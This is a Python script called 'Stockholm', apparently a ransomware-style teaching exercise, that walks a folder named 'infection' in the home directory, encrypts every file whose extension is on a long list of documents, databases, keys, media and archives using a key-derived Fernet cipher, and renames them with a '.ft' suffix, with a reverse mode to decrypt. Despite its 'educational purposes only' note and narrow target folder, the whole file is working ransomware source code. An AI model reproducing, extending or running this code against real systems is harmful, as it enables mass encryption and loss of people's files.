#!/usr/bin/env python3

import argparse
from hashlib import pbkdf2_hmac
from hashlib import sha256
import stat
import typing as tp
from colorama import Fore, Style
import sys
from cryptography.fernet import Fernet
import os
import base64

SALT = b"stockholm"
FOLDER = "infection"

EXTENSIONS = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb",
    ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf",
    ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf",
    ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml",
    ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps",
    ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
    ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
    ".docb", ".docx", ".doc"
]


class Stockholm:
	def __init__(self, key: str, reverse: bool, silent: bool, dry_run: bool):
		self.key = key
		self.reverse = reverse
		self.silent = silent
		self.dry_run = dry_run
		if not self.validate_key(key):
			self.log("error", "Invalid key. Key must be at least 16 characters long.")
			sys.exit(1)
			
	def log(self, level: str, message: str):
		if self.silent:
			return
		levels = {
			"info": Fore.CYAN + "[INFO]   " + Style.RESET_ALL,
			"warning": Fore.YELLOW + "[WARNING]" + Style.RESET_ALL,
			"error": 	Fore.RED + "[ERROR]  " + Style.RESET_ALL,
			"success": Fore.GREEN + "[SUCCESS]" + Style.RESET_ALL
		}
		print(levels.get(level, "[UNKNOWN]") + " " + message)

	@staticmethod
	def validate_key(key: str) -> bool:
		if len(key) < 16:
			return False
		return True

	@staticmethod
	def check_file_extension_decryption(file: str) -> bool:
		return file.endswith(".ft")

	@staticmethod
	def check_file_extension(file: str) -> bool:
		for extension in EXTENSIONS:
			if file.endswith(extension):
				return True
		return False

	@staticmethod
	def remove_file_extension(file: str) -> str:
		return file[:-3]

	def make_key_fernet_safe(self) -> bytes:
		key = pbkdf2_hmac(
			hash_name='sha256',
			password=self.key.encode(),
			salt=SALT,
			iterations=100_000,
			dklen=32
		)
		return base64.urlsafe_b64encode(key) 

	def encrypt(self, file: str, cipher: Fernet) -> None:
		if not self.check_file_extension(file):
			self.log("info", f"File '{file}' is excluded from encryption.")
			return
		try:
			with open(file, "rb") as f:
				data = f.read()
			encrypted_data = cipher.encrypt(data)
			if self.dry_run:
				self.log("success", f"Would encrypt '{file}'.")
				return
			with open(file, "wb") as f:
				f.write(encrypted_data)
			os.rename(file, file + ".ft")
			self.log("success", f"Encrypted '{file}'.")
		except Exception as e:
			self.log("error", f"Failed to encrypt '{file}'.")
			self.log("error", f"Error: {e}")

	def decrypt(self, file: str, cipher: Fernet) -> None:
		if not self.check_file_extension_decryption(file):
			self.log("info", f"File '{file}' is excluded from decryption.")
			return
		if self.dry_run:
			self.log("success", f"Would decrypt '{file}'.")
			return
		try:
			with open(file, "rb") as f:
				data = f.read()
			decrypted_data = cipher.decrypt(data)
			with open(file, "wb") as f:
				f.write(decrypted_data)
			os.rename(file, self.remove_file_extension(file))
			self.log("success", f"Decrypted '{file}'.")
		except Exception as e:
			self.log("error", f"Failed to decrypt '{file}'.")
			self.log("error", f"Error: {e}")

	def run(self) -> None:
		cipher = Fernet(self.make_key_fernet_safe())
		for root, _, files in os.walk(os.path.expanduser("~/" + FOLDER)):
			for file in files:
				if not os.path.isfile(os.path.join(root, file)):
					continue
				file = os.path.join(root, file)
				if self.reverse:
					self.decrypt(file, cipher)
				else:
					self.encrypt(file, cipher)

def main():
	parser = argparse.ArgumentParser(
		description='Stockholm - A simple encryption tool.',
		epilog='Stockholm is a simple encryption tool that uses a key to encrypt and decrypt files. This project is for educational purposes only. You should never use this type of program for malicious purposes.')
	parser.add_argument('key', type=str, help='The key to use for encryption.')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s 0.0.42')
	parser.add_argument('-r', '--reverse', action='store_true', help='Reverse the encryption.')
	parser.add_argument('-s', '--silent', action='store_true', help='Silent mode.')
	parser.add_argument('-u', '--dry-run', action='store_true', help='Dry run (no encryption - just printing what would be done).')
	args = parser.parse_args()
 
	stockholm = Stockholm(args.key, args.reverse, args.silent, args.dry_run)
	stockholm.run()
 
if __name__ == '__main__':
	main()